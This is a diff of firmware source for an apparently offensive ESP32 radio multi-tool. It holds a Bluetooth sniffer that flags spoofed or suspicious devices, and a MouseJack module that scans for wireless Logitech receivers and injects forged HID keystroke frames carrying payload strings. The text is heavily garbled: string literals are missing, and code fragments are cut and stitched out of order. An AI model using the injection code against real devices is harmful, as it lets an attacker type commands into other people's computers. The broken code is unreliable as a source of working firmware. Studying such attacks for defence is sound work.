@@ -1,0 +1,5058 @@
+=== ESP32-DIV.ino ===
+BROWNOUT(3.3V欠压跌落)
+EXT(外部引脚)
+GitHub
+PCF8574 buttons disabled for this board
+PCF8574 buttons unavailable
+PN532 not found. Check SPI wiring/pins.
+POWERON(断电/EN拉低再上电)
+SW(软件ESP.restart)
+SettingsStore.h
+Touchscreen.h
+WDT(看门狗)
+[boot] BLE/WiFi-bg deferred (v1)
+[boot] ready
+[boot] settings defaults (v1, SD deferred)
+[boot] start
+by 
+config.h
+ducky.h
+gps.h
+i18n.h
+icon.h
+ir.h
+rfid.h
+shared.h
+soc/rtc_cntl_reg.h
+soc/soc.h
+utils.h
+
+=== KeyboardUI.cpp ===
+ASDFGHJKL^
+KeyboardUI.h
+QWERTYUIOP
+Touchscreen.h
+ZXCVBNM #<
+asdfghjkl^
+utils.h
+zxcvbnm #<
+
+=== SettingsStore.cpp ===
+Cyan
+Green
+Orange
+Purple
+Red
+SettingsStore.h
+White
+Yellow
+accentColor
+autoBleScan
+autoWifiScan
+neopixelEnabled
+utils.h
+xMax
+xMin
+yMax
+yMin
+
+=== SettingsStore.h ===
+i18n.h
+shared.h
+
+=== Theme.cpp ===
+SettingsStore.h
+shared.h
+
+=== Touchscreen.cpp ===
+SettingsStore.h
+Touchscreen.h
+
+=== Touchscreen.h ===
+SettingsStore.h
+shared.h
+
+=== bleconfig.h ===
+BleCompat.h
+esp_bt.h
+esp_bt_main.h
+esp_gap_bt_api.h
+esp_wifi.h
+shared.h
+utils.h
+
+=== bluetooth.cpp ===
+
+#define ALERT_FLASH_DURATION 1000
+#define SEPARATOR_THICKNESS 1
+#define SEPARATOR_MARGIN 5
+#define Y_OFFSET 37
+
+struct Config {
+  static constexpr int tftRotation = 0;
+  static constexpr int serialBaud = 115200;
+  static constexpr int bleScanDuration = 5;
+  static constexpr int btScanDuration = 5;
+  static constexpr int maxPacketCount = 20;
+  static constexpr int minRssiThreshold = -20;
+  static constexpr int maxNewDevices = 20;
+  static constexpr int maxMfgDataLength = 31;
+  static constexpr unsigned long deviceTimeout = 30000;
+  static constexpr int maxRandomizedMacChanges = 5;
+};
+
+enum class MessageType {
+  DEVICE,
+  ALERT,
+  STATUS
+};
+
+struct DeviceInfo {
+  String mac;
+  int rssi = 0;
+  int packetCount = 0;
+  bool isSuspicious = false;
+  String deviceName;
+  String serviceUUID;
+  String beaconUUID;
+  unsigned long lastSeen = 0;
+  bool display = true;
+  bool jammingAlerted = false;
+  bool isBLE = true;
+  int macChangeCount = 0;
+};
+
+struct DisplayLine {
+  String text;
+  uint16_t color = GREEN;
+  uint16_t originalColor = GREEN;
+  bool isAlert = false;
+  unsigned long flashUntil = 0;
+  MessageType type = MessageType::DEVICE;
+};
+
+class BluetoothSniffer {
+private:
+  DeviceInfo devices[MAX_DEVICES];
+  DisplayLine displayLines[MAX_LINES];
+  int deviceCount = 0;
+  int lineNumber = 1;
+  int suspiciousCount = 0;
+  int newDevicesThisScan = 0;
+  int lastDeviceCount = -1;
+  int lastSuspiciousCount = -1;
+  bool scanning = true;
+  bool isBLEScanActive = true;
+  unsigned long lastScanTime = 0;
+  unsigned long lastFlashToggle = 0;
+  bool flashState = false;
+  BLEScan* pBLEScan = nullptr;
+  BLEAdvertisedDeviceCallbacks* bleDeviceCallbacks = nullptr;
+  static BluetoothSniffer* snifferInstance;
+
+  void releaseBleCallbacks() {
+    if (pBLEScan) {
+      pBLEScan->stop();
+      pBLEScan->setAdvertisedDeviceCallbacks(nullptr);
+    }
+    delete bleDeviceCallbacks;
+    bleDeviceCallbacks = nullptr;
+  }
+
+  static int snifferContentTop() {
+    return Y_OFFSET + HEADER_HEIGHT;
+  }
+
+  static int snifferVisibleLines() {
+    return bleMaxLinesInZone(snifferContentTop(), LINE_HEIGHT);
+  }
+
+  static bool snifferLineFits(int lineIndex) {
+    const int y = snifferContentTop() + (lineIndex * LINE_HEIGHT);
+    return y + LINE_HEIGHT <= bleContentBottom();
+  }
+
+  void initDisplay() {
+    uiDrawn = false;
+
+    float currentBatteryVoltage = readBatteryVoltage();
+    drawStatusBar(currentBatteryVoltage, true);
+    runUI();
+
+    setupTouchscreen();
+    {
+      const int bodyH = bleContentBottom() - 37;
+      if (bodyH > 0) {
+        tft.fillRect(0, 37, 240, bodyH, TFT_BLACK);
+      }
+    }
+    uiSetTextSize(1);
+    updateHeader();
+
+  }
+
+  void updateHeader() {
+    if (!scanning) return;
+    tft.fillRect(0, Y_OFFSET, tft.width(), HEADER_HEIGHT, DARK_GRAY);
+    uiSetTextColor(WHITE, DARK_GRAY);
+    uiSetCursor(5, Y_OFFSET + 6);
+    String status = isBLEScanActive ? 
+    Arm, then Prev/Next
+  |  Sniffing
+  |  Stopped
+ + String(device.rssi) + 
+ + String(deviceCount) + 
+ + String(devices[i].lastSeen).substring(0, 6);
+        addLine(line, devices[i].isSuspicious ? ORANGE : GREEN, false, MessageType::DEVICE);
+      }
+    }
+  }
+
+void runUI() {
+
+  static int iconY = STATUS_BAR_Y_OFFSET;
+
+  if (!uiDrawn) {
+    tft.drawFastHLine(0, 19, 240, UI_LINE);
+    tft.drawFastHLine(0, 36, 240, UI_LINE);
+    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
+
+    for (int i = 0; i < ICON_NUM; i++) {
+      if (icons[i] != NULL) {
+        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
+      }
+    }
+    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
+    uiDrawn = true;
+  }
+
+  static unsigned long lastAnimationTime = 0;
+  static int animationState = 0;
+  static int activeIcon = -1;
+
+  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
+    if (animationState == 1) {
+      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
+      animationState = 2;
+
+      switch (activeIcon) {
+        case 0:
+            deviceCount = 0;
+            suspiciousCount = 0;
+            lastDeviceCount = -1;
+            lastSuspiciousCount = -1;
+            lineNumber = 1;
+            for (int i = 0; i < MAX_LINES; i++) {
+              displayLines[i].text = 
+ + String(devices[i].rssi) + 
+ + String(millis()), DARK_GRAY, true, MessageType::STATUS);
+    updateHeader();
+  }
+
+  void startBTScan() {
+    newDevicesThisScan = 0;
+
+    addLine(
+ + String(suspiciousCount));
+    uint16_t dotColor = isBLEScanActive ? BLUE : GREEN;
+    tft.fillCircle(tft.width() - 10, 46, STATUS_DOT_SIZE / 2, dotColor);
+    tft.drawFastHLine(0, 56, 240, UI_LINE);
+  }
+
+  void updateDisplay() {
+    if (!scanning) return;
+    unsigned long now = millis();
+    if (now - lastFlashToggle >= 500) {
+      flashState = !flashState;
+      lastFlashToggle = now;
+    }
+    {
+      const int bodyTop = Y_OFFSET + HEADER_HEIGHT;
+      const int bodyH = bleContentBottom() - bodyTop;
+      if (bodyH > 0) {
+        tft.fillRect(0, bodyTop, tft.width(), bodyH, TFT_BLACK);
+      }
+    }
+    const int visibleLines = snifferVisibleLines();
+    for (int i = 0; i < visibleLines; i++) {
+      if (displayLines[i].text.isEmpty()) continue;
+      if (!snifferLineFits(i)) continue;
+      int y = snifferContentTop() + (i * LINE_HEIGHT);
+      uint16_t textColor = displayLines[i].originalColor;
+      if (displayLines[i].isAlert && displayLines[i].flashUntil > now) {
+        textColor = flashState ? displayLines[i].originalColor : TFT_BLACK;
+      }
+      uiSetTextColor(textColor, TFT_BLACK);
+      uiSetCursor(5, y + 2);
+      uiPrint(displayLines[i].text);
+      if (displayLines[i].originalColor == ORANGE && !displayLines[i].isAlert) {
+        tft.drawRect(3, y, tft.width() - 6, LINE_HEIGHT - 2, ORANGE);
+      }
+      if (i < visibleLines - 1 && !displayLines[i + 1].text.isEmpty() &&
+          displayLines[i].type != displayLines[i + 1].type && snifferLineFits(i + 1)) {
+        int separatorY = y + LINE_HEIGHT - 1;
+        tft.drawFastHLine(SEPARATOR_MARGIN, separatorY, tft.width() - 2 * SEPARATOR_MARGIN, DARK_GRAY);
+      }
+    }
+    if (deviceCount != lastDeviceCount || suspiciousCount != lastSuspiciousCount) {
+      updateHeader();
+      lastDeviceCount = deviceCount;
+      lastSuspiciousCount = suspiciousCount;
+    }
+    if (deviceCount == 0 && lineNumber == 1) {
+      uiSetTextColor(GREEN, TFT_BLACK);
+      uiSetCursor(5, snifferContentTop() + 10);
+    }
+  }
+
+  void addLine(String text, uint16_t color, bool isAlert = false, MessageType type = MessageType::DEVICE) {
+    if (!scanning) return;
+    if (text.length() > MAX_LINE_LENGTH) {
+      text = text.substring(0, MAX_LINE_LENGTH - 3) + 
+ + String(timestamp),
+                  ORANGE, true, MessageType::ALERT);
+          device.jammingAlerted = true;
+        }
+      }
+    }
+    if (device.isBLE && isRandomizedMac(device.mac) && device.macChangeCount > Config::maxRandomizedMacChanges) {
+      device.isSuspicious = true;
+      suspiciousCount++;
+      if (device.display) {
+        addLine(String(lineNumber++) + 
+ + String(timestamp),
+                  ORANGE, true, MessageType::ALERT);
+        }
+      }
+    }
+  }
+
+  void checkMalformedPacket(DeviceInfo& device, const String& mfgData, unsigned long timestamp) {
+    if (!device.isBLE || mfgData.length() <= Config::maxMfgDataLength) return;
+    device.isSuspicious = true;
+    suspiciousCount++;
+    if (device.display) {
+      addLine(String(lineNumber++) + 
+ + String(timestamp),
+                  ORANGE, true, MessageType::ALERT);
+        }
+      }
+    }
+  }
+
+  void cleanupDevices(unsigned long timestamp) {
+    for (int i = 0; i < deviceCount; ) {
+      if (timestamp - devices[i].lastSeen > Config::deviceTimeout) {
+        if (devices[i].isSuspicious) suspiciousCount--;
+        for (int j = i; j < deviceCount - 1; j++) {
+          devices[j] = devices[j + 1];
+        }
+        deviceCount--;
+      } else {
+        i++;
+      }
+    }
+  }
+
+  void filterByMac(const String& filterMac) {
+    for (int i = 0; i < deviceCount; i++) {
+      devices[i].display = (devices[i].mac == filterMac);
+    }
+    refreshDisplay();
+  }
+
+  void filterSuspicious() {
+    for (int i = 0; i < deviceCount; i++) {
+      devices[i].display = devices[i].isSuspicious;
+    }
+    refreshDisplay();
+  }
+
+  void refreshDisplay() {
+    for (int i = 0; i < MAX_LINES; i++) {
+      displayLines[i].text = 
+ + String(timestamp),
+                ORANGE, true, MessageType::ALERT);
+      }
+    }
+  }
+
+  bool isRandomizedMac(const String& mac) {
+    String firstByte = mac.substring(0, 2);
+    char* end;
+    long value = strtol(firstByte.c_str(), &end, 16);
+    return (value & 0xC0) == 0xC0;
+  }
+
+  void processNewDevice(BLEAdvertisedDevice* bleDevice, esp_bt_gap_cb_param_t* btDevice, unsigned long timestamp, bool isBLE) {
+    if (deviceCount >= MAX_DEVICES) {
+      addLine(
+ + String(timestamp),
+              ORANGE, true, MessageType::ALERT);
+    }
+  }
+
+  void checkBeaconSpoofing(DeviceInfo& device, const String& mfgData, unsigned long timestamp) {
+    if (!device.isBLE || !mfgData.startsWith(BEACON_PREFIX)) return;
+    device.beaconUUID = mfgData.substring(4, 36);
+    for (int i = 0; i < deviceCount; i++) {
+      if (devices[i].beaconUUID == device.beaconUUID && devices[i].mac != device.mac) {
+        devices[i].isSuspicious = true;
+        device.isSuspicious = true;
+        suspiciousCount++;
+        if (device.display) {
+          addLine(String(lineNumber++) + 
+ + String(timestamp),
+              ORANGE, true, MessageType::ALERT);
+    }
+  }
+
+  void checkMacSpoofing(DeviceInfo& device, unsigned long timestamp) {
+    for (int i = 0; i < deviceCount; i++) {
+      if (devices[i].mac == device.mac && i != deviceCount) {
+        devices[i].isSuspicious = true;
+        device.isSuspicious = true;
+        suspiciousCount++;
+        if (device.display) {
+          String protocol = device.isBLE ? 
+ + String(timestamp).substring(0, 6);
+      addLine(line, device.isSuspicious ? ORANGE : GREEN, false, MessageType::DEVICE);
+    }
+    deviceCount++;
+    if (newDevicesThisScan > Config::maxNewDevices && device.display) {
+      String protocol = isBLE ? 
+ + device.deviceName.substring(0, 6);
+      if (isBLE && !device.serviceUUID.isEmpty()) line += 
+ + device.mac + 
+ + device.serviceUUID.substring(0, 8);
+      line += 
+ + devices[i].deviceName.substring(0, 6);
+        if (devices[i].isBLE && !devices[i].serviceUUID.isEmpty()) line += 
+ + devices[i].mac + 
+ + devices[i].serviceUUID.substring(0, 8);
+        line += 
+ + protocol + 
+ GHz
+ VULN
+ ch
+ channel(s)
+ dBm
+ hit(s)  peak Ch
+ hop
+ targets
+ x
+': modifier = 0x02; key = 0x34; return true;
+    case '<': modifier = 0x02; key = 0x36; return true;
+    case '>': modifier = 0x02; key = 0x37; return true;
+    case '?': modifier = 0x02; key = 0x38; return true;
+    default: return false;
+  }
+}
+
+static void injWritePayload(const uint8_t* data, uint8_t len) {
+  digitalWrite(CSN, LOW);
+  SPI.transfer(0xA0);  
+  for (uint8_t i = 0; i < len; i++) SPI.transfer(data[i]);
+  digitalWrite(CSN, HIGH);
+
+  injSetRegister(_INJ_STATUS, 0x70);
+  
+  injEnable();
+  delayMicroseconds(15);
+  injDisable();
+  delayMicroseconds(150);
+}
+
+static void injSendHidFrame(uint8_t modifier, uint8_t key) {
+  
+  uint8_t frame[10] = {
+    0x00, 0xC1, modifier, key, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+  };
+  frame[9] = injLogitechChecksum(frame, 10);
+  injWritePayload(frame, 10);
+}
+
+static void injSendKeepalive() {
+  uint8_t payload[5];
+  payload[0] = 0x00;
+  payload[1] = 0x40;
+  payload[2] = 0x4F;
+  payload[3] = 110;
+  payload[4] = 0;
+  payload[4] = injLogitechChecksum(payload, 5);
+  injWritePayload(payload, 5);
+}
+
+static void injTransmitString(const char* text) {
+  if (s_targetCount <= 0 || s_targetIndex < 0 || s_targetIndex >= s_targetCount) {
+    injAppendLog(
+) + String(s_targetCount) + 
+) + String(strlen(text)) + 
+) + kPayloads[s_payloadIndex], UI_DIM_TEXT);
+  injFlushUi(true);
+}
+
+static void injToggleScanOrFire() {
+  
+  injStopScan();
+  injTransmitString(kPayloads[s_payloadIndex]);
+}
+
+static unsigned long s_injLastBtnMs = 0;
+
+static void injWaitNavRelease(int pin) {
+  const uint32_t t0 = millis();
+  while (isTouchNavButtonPressed(pin) && millis() - t0 < 400) delay(5);
+  delay(30);
+}
+
+void injHandleNavButtons() {
+  if (!featureHasTouchNavBar()) return;
+  if (millis() - s_injLastBtnMs < 80) return;
+
+  if (isTouchNavButtonPressedEdge(BTN_LEFT)) {
+    injPrevTarget();
+    s_injLastBtnMs = millis();
+    injWaitNavRelease(BTN_LEFT);
+    return;
+  }
+  if (isTouchNavButtonPressedEdge(BTN_RIGHT)) {
+    injNextTarget();
+    s_injLastBtnMs = millis();
+    injWaitNavRelease(BTN_RIGHT);
+    return;
+  }
+  if (isTouchNavButtonPressedEdge(BTN_DOWN)) {
+    if (s_scanning) {
+      injStopScan();
+    } else {
+      injNextPayload();
+    }
+    s_injLastBtnMs = millis();
+    injWaitNavRelease(BTN_DOWN);
+    return;
+  }
+  if (isTouchNavButtonPressedEdge(BTN_UP)) {
+    if (s_targetCount == 0 || s_scanning) {
+      if (s_scanning) injStopScan();
+      else injStartScan();
+    } else {
+      injToggleScanOrFire();
+    }
+    s_injLastBtnMs = millis();
+    injWaitNavRelease(BTN_UP);
+  }
+}
+
+void runUI() {
+  static constexpr int kBarY = 20;
+  static constexpr int kBarH = 16;
+  static constexpr int kIconSz = 16;
+  static constexpr int kIconN = 5;
+  static int iconX[kIconN] = {90, 130, 170, 210, 10};
+  static int iconY = kBarY;
+  static const unsigned char* icons[kIconN] = {
+    bitmap_icon_LEFT,
+    bitmap_icon_random,
+    bitmap_icon_start,
+    bitmap_icon_RIGHT,
+    bitmap_icon_go_back
+  };
+
+  if (!uiDrawn) {
+    tft.fillRect(0, kBarY, 240, kBarH, DARK_GRAY);
+    for (int i = 0; i < kIconN; i++) {
+      if (icons[i]) tft.drawBitmap(iconX[i], iconY, icons[i], kIconSz, kIconSz, UI_ICON);
+    }
+    tft.drawFastHLine(0, 19, 240, UI_LINE);
+    tft.drawFastHLine(0, kBarY + kBarH, 240, UI_LINE);
+    uiDrawn = true;
+  }
+
+  static unsigned long lastAnimationTime = 0;
+  static int animationState = 0;
+  static int activeIcon = -1;
+
+  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
+    if (animationState == 1) {
+      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], kIconSz, kIconSz, UI_ICON);
+      animationState = 2;
+      switch (activeIcon) {
+        case 0: injPrevTarget(); break;
+        case 1:
+          if (s_scanning) injStopScan();
+          else injStartScan();
+          break;
+        case 2:
+          if (s_targetCount == 0) injStartScan();
+          else injToggleScanOrFire();
+          break;
+        case 3: injNextTarget(); break;
+      }
+    } else if (animationState == 2) {
+      animationState = 0;
+      activeIcon = -1;
+    }
+    lastAnimationTime = millis();
+  }
+
+  static unsigned long lastTouchCheck = 0;
+  if (millis() - lastTouchCheck >= 50) {
+    int x, y;
+    if (feature_active && readTouchXY(x, y)) {
+      if (y > kBarY && y < kBarY + kBarH) {
+        for (int i = 0; i < kIconN; i++) {
+          if (x > iconX[i] && x < iconX[i] + kIconSz) {
+            if (icons[i] && animationState == 0) {
+              if (i == 4) {
+                feature_exit_requested = true;
+                s_active = false;
+              } else {
+                tft.drawBitmap(iconX[i], iconY, icons[i], kIconSz, kIconSz, TFT_BLACK);
+                animationState = 1;
+                activeIcon = i;
+                lastAnimationTime = millis();
+              }
+            }
+            break;
+          }
+        }
+      }
+    }
+    lastTouchCheck = millis();
+  }
+}
+
+void mouseJackInjectSetup() {
+  setTouchButtonInputEnabled(true);
+  bleSetMjInjectNavLabels();
+  bleClearBody(TFT_BLACK);
+
+  uiDrawn = false;
+  s_active = true;
+  s_scanning = false;
+  s_injecting = false;
+  s_channel = kInjChannels[0];
+  s_hopIndex = 0;
+  s_prefixByte = 0;
+  s_lastHopMs = millis();
+  s_payloadIndex = 0;
+  s_injectCount = 0;
+  s_logIndex = 0;
+  s_logDirty = false;
+  s_statusDirty = false;
+  s_lastUiMs = 0;
+
+  for (int i = 0; i < kInjMaxLogLines; i++) {
+    s_logBuffer[i] = 
+) {
+        deviceCount = 0;
+        suspiciousCount = 0;
+        lastDeviceCount = -1;
+        lastSuspiciousCount = -1;
+        lineNumber = 1;
+        for (int i = 0; i < MAX_LINES; i++) {
+          displayLines[i].text = 
+) {
+        filterSuspicious();
+      } else if (input == 
+)) {
+        filterByMac(input.substring(11));
+      } else if (input == 
++ ch
+,
+               btDevice->disc_res.bda[0], btDevice->disc_res.bda[1], btDevice->disc_res.bda[2],
+               btDevice->disc_res.bda[3], btDevice->disc_res.bda[4], btDevice->disc_res.bda[5]);
+      device.mac = macStr;
+      device.rssi = 0;
+    }
+    device.packetCount = 1;
+    device.lastSeen = timestamp;
+    device.display = true;
+    checkMacSpoofing(device, timestamp);
+    checkSuspiciousActivity(deviceCount, timestamp);
+    if (device.display) {
+      String protocol = isBLE ? 
+,
+               param->disc_res.bda[0], param->disc_res.bda[1], param->disc_res.bda[2],
+               param->disc_res.bda[3], param->disc_res.bda[4], param->disc_res.bda[5]);
+      String mac = macStr;
+      for (int i = 0; i < snifferInstance->deviceCount; i++) {
+        if (snifferInstance->devices[i].mac == mac && !snifferInstance->devices[i].isBLE) {
+          idx = i;
+          break;
+        }
+      }
+      if (idx >= 0) {
+        snifferInstance->devices[idx].packetCount++;
+        snifferInstance->devices[idx].lastSeen = timestamp;
+        snifferInstance->checkSuspiciousActivity(idx, timestamp);
+      } else {
+        snifferInstance->processNewDevice(nullptr, param, timestamp, false);
+      }
+    }
+  }
+
+  void startBLEScan() {
+    newDevicesThisScan = 0;
+    constexpr int kScanChunkSec = 1;
+    for (int elapsed = 0; elapsed < Config::bleScanDuration; elapsed += kScanChunkSec) {
+      if (feature_exit_requested || featureExitButtonPressed()) {
+        feature_exit_requested = true;
+        if (pBLEScan) {
+          pBLEScan->stop();
+        }
+        return;
+      }
+      pBLEScan->start(kScanChunkSec, false);
+    }
+    addLine(
+, DARK_GRAY, true, MessageType::STATUS);
+          break;
+        case 1:
+           filterSuspicious();
+          break;
+        case 2:
+           feature_exit_requested = true;
+          break;
+      }
+    } else if (animationState == 2) {
+      animationState = 0;
+      activeIcon = -1;
+    }
+    lastAnimationTime = millis();
+  }
+
+  static unsigned long lastTouchCheck = 0;
+  static bool s_headerTouchHeld = false;
+  const unsigned long touchCheckInterval = 25;
+
+  if (millis() - lastTouchCheck >= touchCheckInterval) {
+    int x = 0;
+    int y = 0;
+    int hitIcon = -1;
+    if (feature_active && readTouchXY(x, y)) {
+      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
+        for (int i = 0; i < ICON_NUM; i++) {
+          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
+            if (icons[i] != NULL && animationState == 0) {
+              hitIcon = i;
+            }
+            break;
+          }
+        }
+      }
+    }
+    if (hitIcon >= 0) {
+      if (!s_headerTouchHeld) {
+        if (hitIcon == 2) {
+          feature_exit_requested = true;
+        } else {
+          tft.drawBitmap(iconX[hitIcon], iconY, icons[hitIcon], ICON_SIZE, ICON_SIZE, TFT_BLACK);
+          animationState = 1;
+          activeIcon = hitIcon;
+          lastAnimationTime = millis();
+        }
+      }
+      s_headerTouchHeld = true;
+    } else {
+      s_headerTouchHeld = false;
+    }
+    lastTouchCheck = millis();
+  }
+}
+
+public:
+  void setup() {
+    uiDrawn = false;
+
+    float currentBatteryVoltage = readBatteryVoltage();
+    drawStatusBar(currentBatteryVoltage, false);
+    runUI();
+
+    setupTouchscreen();
+
+    initDisplay();
+
+    releaseBleCallbacks();
+    ensureBleStackReady();
+    pBLEScan = BLEDevice::getScan();
+    bleDeviceCallbacks = new AdvertisedDeviceCallbacks(*this);
+    pBLEScan->setAdvertisedDeviceCallbacks(bleDeviceCallbacks);
+    pBLEScan->setActiveScan(true);
+    scanning = true;
+
+    addLine(
+, DARK_GRAY, true, MessageType::STATUS);
+      }
+    }
+  }
+
+  class AdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
+    BluetoothSniffer& sniffer;
+  public:
+    AdvertisedDeviceCallbacks(BluetoothSniffer& s) : sniffer(s) {}
+    void onResult(BLEAdvertisedDevice* advertisedDevice) override {
+      if (!sniffer.scanning) return;
+      String mac = advertisedDevice->getAddress().toString().c_str();
+      int rssi = advertisedDevice->getRSSI();
+      unsigned long timestamp = millis();
+      int idx = -1;
+      for (int i = 0; i < sniffer.deviceCount; i++) {
+        if (sniffer.devices[i].mac == mac && sniffer.devices[i].isBLE) {
+          idx = i;
+          break;
+        }
+      }
+      if (idx >= 0) {
+        sniffer.devices[idx].rssi = rssi;
+        sniffer.devices[idx].packetCount++;
+        sniffer.devices[idx].lastSeen = timestamp;
+        if (sniffer.isRandomizedMac(mac)) {
+          sniffer.devices[idx].macChangeCount++;
+        }
+        sniffer.checkSuspiciousActivity(idx, timestamp);
+      } else {
+        sniffer.processNewDevice(advertisedDevice, nullptr, timestamp, true);
+      }
+    }
+  };
+
+  static void btCallback(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param) {
+    if (!snifferInstance) return;
+    if (event == ESP_BT_GAP_DISC_RES_EVT) {
+      unsigned long timestamp = millis();
+      int idx = -1;
+      char macStr[18];
+      snprintf(macStr, sizeof(macStr), 
+, DARK_GRAY, true, MessageType::STATUS);
+    startBLEScan();
+  }
+
+  void loop() {
+    if (feature_exit_requested || featureExitButtonPressed()) {
+      feature_exit_requested = true;
+      return;
+    }
+
+    unsigned long now = millis();
+    tft.drawFastHLine(0, 19, 240, UI_LINE);
+
+    runUI();
+    if (feature_exit_requested || featureExitButtonPressed()) {
+      feature_exit_requested = true;
+      return;
+    }
+    updateStatusBar();
+    cleanupDevices(now);
+    if (scanning && now - lastScanTime >= SCAN_INTERVAL) {
+      if (isBLEScanActive) {
+        pBLEScan->stop();
+        startBTScan();
+        isBLEScanActive = false;
+      } else {
+
+        startBLEScan();
+        isBLEScanActive = true;
+      }
+      lastScanTime = now;
+    }
+    if (Serial.available()) {
+      String input = Serial.readStringUntil('\n');
+      input.trim();
+      if (input.startsWith(
+, RED, true, MessageType::ALERT);
+      return;
+    }
+    newDevicesThisScan++;
+    auto& device = devices[deviceCount];
+    device.isBLE = isBLE;
+    if (isBLE) {
+      device.mac = bleDevice->getAddress().toString().c_str();
+      device.rssi = bleDevice->getRSSI();
+      device.deviceName = bleDevice->getName().c_str();
+      device.serviceUUID = bleDevice->getServiceUUID().toString().c_str();
+      String mfgData = bleDevice->getManufacturerData().c_str();
+      checkBeaconSpoofing(device, mfgData, timestamp);
+      checkMalformedPacket(device, mfgData, timestamp);
+    } else {
+      char macStr[18];
+      snprintf(macStr, sizeof(macStr), 
+, UI_DIM_TEXT);
+  }
+  s_statusDirty = true;
+  injFlushUi(true);
+  redrawTouchButtonBar();
+
+  setupTouchscreen();
+  pinMode(CE, OUTPUT);
+  pinMode(CSN, OUTPUT);
+  injInitSpi();
+  injDisable();
+  injPowerUp();
+  redrawTouchButtonBar();
+}
+
+void mouseJackInjectLoop() {
+  s_active = true;
+  while (s_active) {
+    if (feature_active && (feature_exit_requested || featureExitButtonPressed())) {
+      feature_exit_requested = true;
+      s_active = false;
+      break;
+    }
+    injHandleNavButtons();
+    maintainTouchNavBar();
+    runUI();
+    if (s_scanning) injScanStep();
+    injFlushUi(false);
+    delay(1);
+  }
+}
+
+void exit() {
+  s_active = false;
+  s_scanning = false;
+  s_injecting = false;
+  injDisable();
+  injPowerDown();
+  digitalWrite(CSN, HIGH);
+  restoreSdAfterSharedSpi();
+}
+
+}  
+
+namespace BleSniffer {
+
+#define SCREEN_WIDTH  240
+#define SCREENHEIGHT 320
+#define STATUS_BAR_Y_OFFSET 20
+#define STATUS_BAR_HEIGHT 16
+#define ICON_SIZE 16
+#define ICON_NUM 3
+
+static bool uiDrawn = false;
+
+static int iconX[ICON_NUM] = {170, 210, 10};
+static const unsigned char* icons[ICON_NUM] = {
+  bitmap_icon_undo,
+  bitmap_icon_eye2,
+  bitmap_icon_go_back
+};
+
+#define HEADER_HEIGHT 20
+#define STATUS_DOT_SIZE 8
+#define LINE_HEIGHT 16
+#define MAX_LINES 16
+#define MAX_DEVICES 32
+#define SCAN_INTERVAL 5000
+#define MAX_LINE_LENGTH 38
+#define BEACON_PREFIX 
+, UI_OK);
+  } else {
+    injAppendLog(
+, UI_WARN);
+    injFlushUi(true);
+    return;
+  }
+  if (s_injecting) return;
+
+  const InjTarget& t = s_targets[s_targetIndex];
+  s_injecting = true;
+  s_scanning = false;
+  s_statusDirty = true;
+  injFlushUi(true);
+
+  injAppendLog(String(
+, UI_WARN);
+  if (s_targetCount > 0) {
+    injAppendLog(String(
+,0x
+;
+              displayLines[i].color = GREEN;
+              displayLines[i].originalColor = GREEN;
+              displayLines[i].isAlert = false;
+              displayLines[i].flashUntil = 0;
+              displayLines[i].type = MessageType::DEVICE;
+            }
+            refreshDisplay();
+            addLine(
+;
+          addLine(String(lineNumber++) + 
+;
+          displayLines[i].color = GREEN;
+          displayLines[i].originalColor = GREEN;
+          displayLines[i].isAlert = false;
+          displayLines[i].flashUntil = 0;
+          displayLines[i].type = MessageType::DEVICE;
+        }
+        refreshDisplay();
+        addLine(
+;
+        String line = String(lineNumber++) + 
+;
+        if (devices[i].isBLE && !devices[i].deviceName.isEmpty()) line += 
+;
+      String line = String(lineNumber++) + 
+;
+      addLine(String(lineNumber++) + 
+;
+      displayLines[i].color = GREEN;
+      displayLines[i].originalColor = GREEN;
+      displayLines[i].isAlert = false;
+      displayLines[i].flashUntil = 0;
+      displayLines[i].type = MessageType::DEVICE;
+    }
+    lineNumber = 1;
+    {
+      const int bodyTop = Y_OFFSET + HEADER_HEIGHT;
+      const int bodyH = bleContentBottom() - bodyTop;
+      if (bodyH > 0) {
+        tft.fillRect(0, bodyTop, tft.width(), bodyH, TFT_BLACK);
+      }
+    }
+    for (int i = 0; i < deviceCount; i++) {
+      if (devices[i].display) {
+        String protocol = devices[i].isBLE ? 
+;
+      if (isBLE && !device.deviceName.isEmpty()) line += 
+;
+    s_logColor[i] = UI_DIM_TEXT;
+    s_logDrawn[i] = 
+;
+    s_logDrawnColor[i] = 0;
+    s_logDrawnW[i] = 0;
+  }
+  for (int i = 0; i < kInjStatusLines; i++) {
+    s_statusText[i] = 
+;
+    s_statusColor[i] = 0;
+    s_statusDrawnW[i] = 0;
+  }
+  for (int i = 0; i < kInjMaxTargets; i++) s_targets[i].used = false;
+
+  injImportShared();
+  s_targetIndex = 0;
+
+  float v = readBatteryVoltage();
+  drawStatusBar(v, true);
+  redrawTouchButtonBar();
+
+  runUI();
+  injDrawTextBoxes();
+  injAppendLog(
+;
+    uiPrint(status + 
+;
+    }
+    const int visibleLines = snifferVisibleLines();
+    for (int i = visibleLines - 1; i > 0; i--) {
+      displayLines[i] = displayLines[i - 1];
+    }
+    for (int i = visibleLines; i < MAX_LINES; i++) {
+      displayLines[i].text = 
+;
+    }
+    displayLines[0].text = text;
+    displayLines[0].color = color;
+    displayLines[0].originalColor = (type == MessageType::STATUS) ? UI_DIM_TEXT : color;
+    displayLines[0].isAlert = isAlert;
+    displayLines[0].flashUntil = isAlert ? millis() + ALERT_FLASH_DURATION : 0;
+    displayLines[0].type = type;
+    updateDisplay();
+  }
+
+  void checkSuspiciousActivity(int idx, unsigned long timestamp) {
+    auto& device = devices[idx];
+    if (device.packetCount > Config::maxPacketCount || (device.isBLE && device.rssi > Config::minRssiThreshold)) {
